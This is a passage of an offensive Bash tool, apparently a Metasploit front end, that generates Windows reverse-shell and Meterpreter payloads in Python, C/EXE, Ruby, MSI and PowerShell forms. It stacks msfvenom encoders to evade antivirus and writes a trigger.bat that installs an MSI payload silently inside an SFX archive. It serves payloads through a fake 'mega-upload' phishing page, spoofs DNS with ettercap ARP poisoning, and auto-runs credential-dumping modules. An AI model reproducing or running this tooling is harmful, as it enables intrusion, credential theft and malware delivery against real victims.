rm $ApAcHe/$N4m > /dev/null 2>&1
rm $ApAcHe/trigger.bat > /dev/null 2>&1
clear
}





# -------------------------------------------------------------
# build shellcode in PYTHON/EXE format (windows)
# 1º option: build default shellcode (my-way)
# 2º veil-evasion python -> pyherion (reproduction)
# 3º use pyinstaller by:david cortesi to compile python-to-exe
# -------------------------------------------------------------
sh_shellcode4 () {
# get user input to build shellcode (python)
echo "[☠ ] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 330) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 330) > /dev/null 2>&1

# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" --width 350 --height 265) > /dev/null 2>&1

echo "[☠ ] Building shellcode -> python language..."
# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
|_PAYLOAD : $paylo

!

# use metasploit to build shellcode
xterm -T "☠ SHELLCODE GENERATOR ☠" -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c > $IPATH/output/chars.raw"

echo ""
# display generated shelcode
cat $IPATH/output/chars.raw
echo "" && echo ""
sleep 2

   # check if all dependencies needed are installed
   # check if template exists (exec.py)
   if [ -e $InJEc2 ]; then
      echo "[☠ ] exec.py -> found!"
      sleep 2
   else
      echo "[☠ ] exec.py -> not found!"
      exit
   fi

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠ ] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠ ] chars.raw -> not found!"
      exit
      fi

# EDITING/BACKUP FILES NEEDED
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode.py" --width 300) > /dev/null 2>&1
echo "[☠ ] editing/backup files..."
cp $InJEc2 $IPATH/templates/exec[bak].py


   # edit exec.py using leafpad or gedit editor
   if [ "$DiStR0" = "Kali" ]; then
      leafpad $InJEc2 > /dev/null 2>&1
   else
      gedit $InJEc2 > /dev/null 2>&1
   fi

# move 'compiled' shellcode to output folder
mv $InJEc2 $IPATH/output/$N4m
chmod +x $IPATH/output/$N4m



# -----------------------------------------
# chose what to do with generated shellcode
# -----------------------------------------
cUe=`echo $N4m | cut -d '.' -f1`
ans=$(zenity --list --title "☠ EXECUTABLE FORMAT ☠" --text "\nChose what to do with: $N4m" --radiolist --column "Pick" --column "Option" TRUE "default ($N4m) python" FALSE "pyherion ($N4m) obfuscated" FALSE "pyinstaller ($cUe.exe) executable" --width 320 --height 210) > /dev/null 2>&1


   if [ "$ans" "=" "default ($N4m) python" ]; then
     zenity --title="☠ PYTHON OUTPUT ☠" --text "PAYLOAD STORED UNDER:\n$IPATH/output/$N4m" --info > /dev/null 2>&1
     # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
     echo "[☠ ] Start a multi-handler..."
     echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
     echo "[☯ ] Please dont test samples on virus total..."
     xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"

     # CLEANING EVERYTHING UP
     echo "[☠ ] Cleanning temp generated files..."
     mv $IPATH/templates/exec[bak].py $InJEc2
     rm $IPATH/output/chars.raw > /dev/null 2>&1
     cd $IPATH/
     sleep 2
     clear


   elif [ "$ans" "=" "pyherion ($N4m) obfuscated" ]; then
     cd $IPATH/obfuscate
     # obfuscating payload (pyherion.py)
     echo "[☠ ] pyherion -> encrypting..."
     sleep 2
     echo "[☠ ] base64+AES encoded -> $N4m!"
     sleep 2
     sudo ./pyherion.py $IPATH/output/$N4m $IPATH/output/$N4m > /dev/null 2>&1
     zenity --title="☠ PYTHON OUTPUT ☠" --text "PAYLOAD STORED UNDER:\n$IPATH/output/$N4m" --info > /dev/null 2>&1
     # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
     echo "[☠ ] Start a multi-handler..."
     echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
     echo "[☯ ] Please dont test samples on virus total..."
     xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"

     # CLEANING EVERYTHING UP
     echo "[☠ ] Cleanning temp generated files..."
     mv $IPATH/templates/exec[bak].py $InJEc2
     rm $IPATH/output/chars.raw > /dev/null 2>&1
     cd $IPATH/
     sleep 2
     clear
      

   else


     # check if pyinstaller its installed
     if [ -d $DrIvC/pyinstaller-2.0 ]; then
       # compile python to exe
       echo "[☠ ] pyinstaller -> found!"
       sleep 2
       echo "[☠ ] compile $N4m -> $cUe.exe"
       sleep 2
       cd $IPATH/output
       xterm -T "☠ PYINSTALLER ☠" -geometry 110x23 -e "su $user -c 'wine c:/Python26/Python.exe c:/pyinstaller-2.0/pyinstaller.py --noconsole --onefile $IPATH/output/$N4m'"
       cp $IPATH/output/dist/$cUe.exe $IPATH/output/$cUe.exe
       rm $IPATH/output/*.spec > /dev/null 2>&1
       rm $IPATH/output/*.log > /dev/null 2>&1
       rm -r $IPATH/output/dist > /dev/null 2>&1
       rm -r $IPATH/output/build > /dev/null 2>&1
       zenity --title="☠ PYINSTALLER ☠" --text "PAYLOAD STORED UNDER:\n$IPATH/output/$cUe.exe" --info > /dev/null 2>&1
       echo ""
       # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
       echo "[☠ ] Start a multi-handler..."
       echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
       echo "[☯ ] Please dont test samples on virus total..."
       xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"

       # CLEANING EVERYTHING UP
       echo "[☠ ] Cleanning temp generated files..."
       mv $IPATH/templates/exec[bak].py $InJEc2
       rm $IPATH/output/chars.raw > /dev/null 2>&1
       sleep 2
       clear

     else

       # compile python to exe
       echo ""
       echo "[☠ ] pyinstaller -> not found!"
       sleep 2
       echo "[☠ ] Please run: cd aux && sudo ./setup.sh"
       echo "[☠ ] to install all missing dependencies..."
       exit
     fi
   fi
cd $IPATH/
}





# -----------------------------------------------------
# build shellcode in EXE format (windows-platforms)
# encoded only using msfvenom encoders :( 
# NOTE: use or not PEScrambler on this or msf -x -k ?...
# it flags 12/55 detections this build .
# ------------------------------------------------------
sh_shellcode5 () {
# get user input to build shellcode
echo "[☠ ] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 330) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 330) > /dev/null 2>&1

# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" --width 350 --height 265) > /dev/null 2>&1

echo "[☠ ] Building shellcode -> C language..."
echo "[☠ ] obfuscating -> msf encoders!"
echo "" > $IPATH/output/chars.raw
# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
|_PAYLOAD : $paylo

!

# use metasploit to build shellcode (msf encoded)
xterm -T "☠ SHELLCODE GENERATOR ☠" -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -a x86 --platform windows -e x86/countdown -i 8 -f raw | msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 7 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f c > $IPATH/output/chars.raw"

echo ""
# display generated shelcode
cat $IPATH/output/chars.raw
echo "" && echo ""
sleep 2

   # check if all dependencies needed are installed
   # check if template exists
   if [ -e $InJEc3 ]; then
      echo "[☠ ] exec_bin.c -> found!"
      sleep 2
   else
      echo "[☠ ] exec_bin.c -> not found!"
      exit
   fi

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠ ] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠ ] chars.raw -> not found!"
      exit
      fi

   # check if mingw32 exists
   c0m=`which i586-mingw32msvc-gcc`> /dev/null 2>&1
   if [ "$?" -eq "0" ]; then
      echo "[☠ ] mingw32 compiler -> found!"
      sleep 2
 
   else

      echo "[☠ ] mingw32 compiler -> not found!"
      echo "[☠ ] Download compiler -> apt-get install mingw32"
      echo ""
      sudo apt-get install mingw32
      echo ""
      fi


# EDITING/BACKUP FILES NEEDED
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode.exe" --width 300) > /dev/null 2>&1
echo "[☠ ] editing/backup files..."
cp $InJEc3 $IPATH/templates/exec_bin[bak].c
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html


   # edit exec.c using leafpad or gedit editor
   if [ "$DiStR0" = "Kali" ]; then
      leafpad $InJEc3 > /dev/null 2>&1
   else
      gedit $InJEc3 > /dev/null 2>&1
   fi


cd $IPATH/templates
# COMPILING SHELLCODE USING mingw32
echo "[☠ ] Compiling using mingw32..."
sleep 2
# special thanks to astr0baby for mingw32 -mwindows flag :D
i586-mingw32msvc-gcc exec_bin.c -o $N4m -mwindows
mv $N4m $IPATH/output/$N4m


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m\n\nchose how to deliver: $N4m" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 350 --height 260) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠ ] Start a multi-handler..."
      echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯ ] Please dont test samples on virus total..."
xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
      sleep 2


   else


      P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" --width 350 --height 240) > /dev/null 2>&1
      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m $ApAcHe/$N4m > /dev/null 2>&1
      echo "[☠ ] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "yes" ]; then
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠ ] Start a multi-handler..."
        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯ ] Please dont test samples on virus total..."
        xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"

        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠ ] Start a multi-handler..."
        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯ ] Please dont test samples on virus total..."
        xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"

        fi
   fi

sleep 2
# CLEANING EVERYTHING UP
echo "[☠ ] Cleanning temp generated files..."
mv $IPATH/templates/exec_bin[bak].c $InJEc3
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m > /dev/null 2>&1
sleep 2
clear
cd $IPATH/
}





# ------------------------------------------------------------
# build shellcode in ruby (windows-platforms)
# veil-evasion ruby payload reproduction (the stager)...
# ruby_stager (template) by: @G0tmi1k @chris truncker @harmj0y
# ------------------------------------------------------------
sh_shellcode6 () {
# get user input to build shellcode
echo "[☠ ] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 330) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 330) > /dev/null 2>&1

# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" --width 350 --height 265) > /dev/null 2>&1

echo "[☠ ] Building shellcode -> Ruby language..."
echo "" > $IPATH/output/chars.raw
# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
|_PAYLOAD : $paylo

!

# use metasploit to build shellcode
xterm -T "☠ SHELLCODE GENERATOR ☠" -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -e x86/shikata_ga_nai -i 3 -f c > $IPATH/output/chars.raw"

echo ""
# display generated shelcode
cat $IPATH/output/chars.raw
echo "" && echo ""
sleep 2

   # check if all dependencies needed are installed
   # check if template exists
   if [ -e $InJEc4 ]; then
      echo "[☠ ] exec.rb -> found!"
      sleep 2
   else
      echo "[☠ ] exec.rb -> not found!"
      exit
   fi

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠ ] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠ ] chars.raw -> not found!"
      exit
      fi


# EDITING/BACKUP FILES NEEDED
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode.rb" --width 300) > /dev/null 2>&1
echo "[☠ ] editing/backup files..."
cp $InJEc4 $IPATH/templates/exec[bak].rb
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html


   # edit exec.c using leafpad or gedit editor
   if [ "$DiStR0" = "Kali" ]; then
      leafpad $InJEc4 > /dev/null 2>&1
   else
      gedit $InJEc4 > /dev/null 2>&1
   fi


     cd $IPATH/templates
     mv $InJEc4 $IPATH/output/$N4m


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m\n\nchose how to deliver: $N4m" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 350 --height 260) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠ ] Start a multi-handler..."
      echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯ ] Please dont test samples on virus total..."
xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
      sleep 2

   else


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m $ApAcHe/$N4m > /dev/null 2>&1
      echo "[☠ ] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "yes" ]; then
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠ ] Start a multi-handler..."
        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯ ] Please dont test samples on virus total..."
        xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"

        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠ ] Start a multi-handler..."
        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯ ] Please dont test samples on virus total..."
        xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"

        fi
   fi

sleep 2
# CLEANING EVERYTHING UP
echo "[☠ ] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/templates/exec[bak].rb $InJEc4
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m > /dev/null 2>&1
rm $ApAcHe/trigger.bat > /dev/null 2>&1
sleep 2
clear
cd $IPATH/
}






# -------------------------------------------
# build shellcode in MSI (windows-platforms)
# and build trigger.bat to use in winrar/sfx
# to be executable by pressing on it :D
# -------------------------------------------
sh_shellcode7 () {
# get user input to build shellcode
echo "[☠ ] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 330) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 330) > /dev/null 2>&1
N4m=$(zenity --title="☠ MSI NAME ☠" --text "example: shellcode.msi" --entry --width 330) > /dev/null 2>&1

# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" --width 350 --height 265) > /dev/null 2>&1

echo "[☠ ] Building shellcode -> msi language..."
# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
|_PAYLOAD : $paylo

!

# use metasploit to build shellcode
xterm -T "☠ SHELLCODE GENERATOR ☠" -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f msi > $IPATH/output/$N4m"
echo ""
echo "[☠ ] editing/backup files..."
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html
echo "[☠ ] Injecting shellcode -> $N4m!"
sleep 2
# build winrar/SFX trigger.bat script
echo "[☠ ] Building winrar/SFX -> trigger.bat..."
sleep 2
echo ":: SFX auxiliary | Author: r00t-3xp10it" > $IPATH/output/trigger.bat
echo ":: this script will run payload using msiexec" >> $IPATH/output/trigger.bat
echo ":: ---" >> $IPATH/output/trigger.bat
echo "@echo off" >> $IPATH/output/trigger.bat
echo "echo [*] Please wait, preparing software ..." >> $IPATH/output/trigger.bat
echo "msiexec /quiet /qn /i $N4m" >> $IPATH/output/trigger.bat
echo "exit" >> $IPATH/output/trigger.bat
sleep 2


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m\n$IPATH/output/trigger.bat\n\nExecute on cmd: msiexec /quiet /qn /i $N4m\n\nchose how to deliver: $N4m" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 350 --height 260) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠ ] Start a multi-handler..."
      echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯ ] Please dont test samples on virus total..."
xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
      sleep 2


   else


      N4m=$(zenity --title="☠ SFX Infection ☠" --text "WARNING BEFOR CLOSING THIS BOX:\n\nTo use SFX attack vector: $N4m needs to be\ncompressed together with trigger.bat into one SFX\n\n1º compress the two files into one SFX\n2º store SFX into shell/output folder\n3º write the name of the SFX file\n4º press OK to continue...\n\nExample:output.exe" --entry --width 360) > /dev/null 2>&1
      P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" --width 350 --height 240) > /dev/null 2>&1
      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m $ApAcHe/$N4m > /dev/null 2>&1
      echo "[☠ ] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "yes" ]; then
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠ ] Start a multi-handler..."
        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯ ] Please dont test samples on virus total..."
        xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"

        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠ ] Start a multi-handler..."
        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯ ] Please dont test samples on virus total..."
        xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"

        fi
   fi

sleep 2
# CLEANING EVERYTHING UP
echo "[☠ ] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m > /dev/null 2>&1
rm $ApAcHe/trigger.bat > /dev/null 2>&1
sleep 2
clear
}





# --------------------------------------------------------------
# build shellcode powershell <DownloadString> + Invoke-Shellcode
# Matthew Graeber - powershell technics (Invoke-Shellcode)
# --------------------------------------------------------------
sh_shellcode8 () {
# get user input to build shellcode
echo "[☠ ] Enter shellcode settings!"
zenity --title="☠ WARNING: ☠" --text "'Invoke-Shellcode' technic only works\nagaints 32 byte systems (windows)" --info > /dev/null 2>&1
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 330) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 330) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ SHELLCODE NAME ☠" --text "Enter shellcode output name\nexample: shellcode.bat" --width 300) > /dev/null 2>&1

# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" --width 350 --height 180) > /dev/null 2>&1


echo "[☠ ] Building shellcode -> powershell language..."
sleep 2
# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
|_PAYLOAD : $paylo

!

# use metasploit to build shellcode
#sudo msfvenom -p $paylo LHOST=$lhost LPORT=$lport -a x86 --platform windows EXITFUNC=thread -f c | sed '1,6d;s/[";]//g;s/\\/,0/g' | tr -d '\n' | cut -c2- > $IPATH/output/chars.raw
cd $IPATH/bin
xterm -T "☠ SHELLCODE GENERATOR ☠" -geometry 110x23 -e "python Invoke-Shellcode.py --lhost $lhost --lport $lport --payload $paylo" > /dev/null 2>&1
rm *.ps1 > /dev/null 2>&1
rm *.vbs > /dev/null 2>&1

# display shellcode
mv *.bat $IPATH/bin/sedding.raw
disp=`cat $IPATH/bin/sedding.raw | grep "Shellcode" | awk {'print $8'}`
echo "$disp" > $IPATH/output/chars.raw
echo ""
echo "[☠ ] shellcode -> powershell encoded!"
sleep 2
echo $disp
echo "" && echo ""
sleep 2

# EDITING/BACKUP FILES NEEDED
echo "[☠ ] editing/backup files..."
cp $InJEc8 $IPATH/templates/InvokePS1[bak].bat
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html
sleep 2


   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠ ] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠ ] chars.raw -> not found!"
      exit
      fi


   # check if template exists
   if [ -e $InJEc8 ]; then
      echo "[☠ ] InvokePS1.bat -> found!"
      sleep 2
   else
      echo "[☠ ] InvokePS1.bat -> not found!"
      exit
   fi


# injecting shellcode into name
cd $IPATH/templates/
echo "[☠ ] Injecting shellcode -> $N4m!"
sleep 2
sed "s|InJ3C|$disp|g" InvokePS1.bat > $N4m
mv $N4m $IPATH/output/$N4m
sleep 2



# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m\n\nExecute: press 2 times to 'execute'\n\nchose how to deliver: $N4m" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 350 --height 260) > /dev/null 2>&1

   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠ ] Start a multi-handler..."
      echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯ ] Please dont test samples on virus total..."
xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
      sleep 2


   else


      P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" --width 350 --height 240) > /dev/null 2>&1
      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m $ApAcHe/$N4m > /dev/null 2>&1
      echo "[☠ ] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "yes" ]; then
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠ ] Start a multi-handler..."
        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯ ] Please dont test samples on virus total..."
        xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"

        else

